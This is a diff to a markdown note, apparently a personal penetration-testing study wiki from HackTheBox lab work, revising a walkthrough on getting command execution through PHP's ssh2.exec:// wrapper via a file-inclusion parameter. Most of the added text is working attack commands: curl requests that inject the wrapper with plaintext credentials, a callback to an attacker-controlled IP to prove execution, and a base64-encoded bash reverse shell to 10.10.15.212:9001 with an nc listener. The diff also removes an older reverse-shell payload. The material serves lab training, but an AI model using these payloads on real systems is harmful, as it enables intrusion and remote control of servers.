@@ -251,21 +251,57 @@ When the PHP **`ssh2` extension** is loaded, PHP can open an SSH connection *thr
 ssh2.exec://<user>:<pass>@<host>:<port>/<command>
 ```
 
-**Procedure:**
+> [!warning] **Opening the stream IS the execution — the return value is a trap.** `ssh2.exec://` runs the command as a *side effect of opening the stream*. If the app `echo`s the opened handle you get `Resource id #5`, **not** the command's output — and you never need the output anyway. Two consequences that will burn you if you don't internalise them:
+> - **A `Resource id #N` means the stream OPENED — i.e. the SSH connection succeeded and your creds authenticated.** It does **not** mean your command ran successfully. (Bad auth returns `false`; `echo false` prints *nothing*, so "empty after the wrapper echoes" = auth failed, "`Resource id #N`" = connected.) **Stream-open success and command success are different things — from here every failure looks identical to success.**
+> - **You will never see command output.** Judge execution by an **out-of-band side effect** (a callback / DNS lookup), never by the page.
+
+**The sink usually mangles your string — find its behaviour first.** These wrappers are reached through some app parameter, and the code around the sink almost always (a) **concatenates a fixed suffix** onto your input (`fopen($_GET['format'] . "files/backup.zip")`) and (b) **echoes what it's about to open** (`Opening: <string>`). That echo is your **oracle** — it shows the exact string handed to `fopen()`, so you can fix encoding/collision problems *before* caring whether anything executed.
+
+**Staged procedure — change one thing per stage:**
 
 ```bash
-# 1. Confirm the extension is present — do NOT skip this, it's the usual reason it "doesn't work"
-curl -s "http://target/?file=php://filter/read=convert.base64-encode/resource=/etc/php/8.1/apache2/php.ini" \
-  | base64 -d | grep -i ssh2
-#   (or read a phpinfo page and look for "SSH2 Support => enabled")
+# 0. Confirm the extension exists (no ssh2 => dead). Read php.ini or a phpinfo page:
+curl -s "http://target/?file=php://filter/read=convert.base64-encode/resource=/etc/php/8.1/apache2/php.ini" | base64 -d | grep -i ssh2
 
-# 2. Run a command as the SSH user — its stdout comes back in the response body
-curl -s "http://target/?file=ssh2.exec://yuri:mustang@127.0.0.1:22/id"
-#   -> uid=1000(yuri) gid=1000(yuri) ...
+# 1. REACH THE BRANCH. The wrapper is worthless if the request doesn't hit the sink.
+#    Satisfy every gate the code demands — right vhost/path, exact param NAME, required
+#    flags, session/authz — then send a value with NO :// and look for the app's echo:
+curl -s -b 'PHPSESSID=<sess>' -G http://file.target/download.php \
+  --data-urlencode 'id=54' --data-urlencode 'show=true' --data-urlencode 'format=x'
+#    -> "Opening: files/backup.zip"  = you're in the branch (session/authz OK). Good.
+#    -> the app's normal page instead = a gate failed; fix that before touching the payload.
 
-# 3. Turn it into a real foothold — reverse shell (URL-encode the command: space=%20, &=%26)
-curl -s "http://target/?file=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261'"
+# 2. READ THE ORACLE. Add :// so your value becomes the wrapper; see how the suffix collides:
+#    --data-urlencode: write the wrapper in PLAINTEXT, let curl encode it ONCE.
+curl -s -b 'PHPSESSID=<sess>' -G http://file.target/download.php \
+  --data-urlencode 'id=54' --data-urlencode 'show=true' \
+  --data-urlencode 'format=ssh2.exec://yuri:mustang@127.0.0.1:22/id'
+#    Opening: ssh2.exec://yuri:mustang@127.0.0.1:22/idfiles/backup.zip
+#    -> the suffix welded onto "id" => one token "idfiles/backup.zip" (a command that doesn't exist)
+
+# 3. SOLVE THE COLLISION. The exec string goes to a shell, so end your command and let the
+#    junk become a separate, harmless one: a ";" terminator (or "#" to comment out the tail).
+#      .../id;            -> runs `id`, then `files/backup.zip` fails harmlessly
+#    Confirm the ";" survived by re-reading the Opening: line.
+
+# 4. PROVE EXECUTION out-of-band (you cannot see output). Callback to a listener you control:
+python3 -m http.server 8001        # terminal 1
+curl -s -b 'PHPSESSID=<sess>' -G http://file.target/download.php \
+  --data-urlencode 'id=54' --data-urlencode 'show=true' \
+  --data-urlencode 'format=ssh2.exec://yuri:mustang@127.0.0.1:22/curl 10.10.15.212:8001/pwned;'
+#    A "GET /pwned" in terminal 1 = RCE proven. Nothing = the command didn't run.
+
+# 5. SHELL — only now. base64 the payload so >, &, ', + never touch the URL parser:
+echo -n 'bash -i >& /dev/tcp/10.10.15.212/9001 0>&1' | base64 -w0     # YmFzaCat...
+nc -lvnp 9001                       # terminal 1
+curl -s -b 'PHPSESSID=<sess>' -G http://file.target/download.php \
+  --data-urlencode 'id=54' --data-urlencode 'show=true' \
+  --data-urlencode 'format=ssh2.exec://yuri:mustang@127.0.0.1:22/echo <BASE64>|base64 -d|bash;'
 ```
+
+> [!warning] **Encode ONCE, at the outermost layer.** The classic failure: you hand-encode the command (`bash%20-c%20...`) *and* pass it through `--data-urlencode`, so `%` → `%25`, the server decodes that back to a literal `%`, and your spaces never materialise — the `Opening:` line shows `bash%20-c%20'...` as one giant token. With `--data-urlencode` you write **plaintext** and curl escapes it exactly once. (Same double-encode mechanic as the LFI decode-order gap above / the BroScience `%`-in-password trap — here it works *against* you.) Read it back off the `Opening:` oracle: real spaces = good, literal `%20` = you double-encoded.
+
+> [!tip] **Why base64 the shell payload:** `>`, `&`, `'`, and especially `+` are fragile through URL parsing (`+` decodes to a space and silently corrupts the payload). `echo <b64>|base64 -d|bash` reduces the whole reverse shell to `[A-Za-z0-9+/=]`, and `--data-urlencode` escapes the one `+` to `%2B` correctly. Same reasoning as the quoting-layers problem in [[Class notes/HTB Academy/CPTS v2 (claude)/Command Injection|Command Injection]]: keep the fragile characters out of the transport.
 
 > [!note] **Companion — `ssh2.sftp://` for arbitrary file read** over the same SSH session. You read as the *SSH user*, which usually sees more than `www-data` (e.g. that user's home, `user.txt`):
 > ```
@@ -273,7 +309,7 @@ curl -s "http://target/?file=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'
 > ```
 > On some PHP builds the SFTP wrapper needs a doubled leading slash for an absolute path (`ssh2.sftp://…:22//etc/passwd`) — if a path returns empty, try adding one.
 
-> [!warning] **Why it "fails" when it should work:** (1) the `ssh2` extension is simply **not installed** on most hosts — that's step 1 for a reason, verify before assuming creds are wrong; (2) through an `include()` sink you *also* need `allow_url_include=On` — if `exec` runs nothing there, try the identical wrapper against a read-style sink, or confirm the ini setting by base64-reading `php.ini`. Host-key verification is a non-issue against `127.0.0.1`.
+> [!warning] **Why it "fails" when it should work:** (1) the `ssh2` extension simply **isn't installed** on most hosts — verify before assuming creds are wrong; (2) an `include()` sink also needs `allow_url_include=On` — if nothing runs there, try the identical wrapper against a read-style sink; (3) you're not actually in the vulnerable branch (Stage 1) — a missing param/flag/session silently routes you elsewhere. Host-key verification is a non-issue against `127.0.0.1`.
 
 ### zip:// - Execute from Zips
 
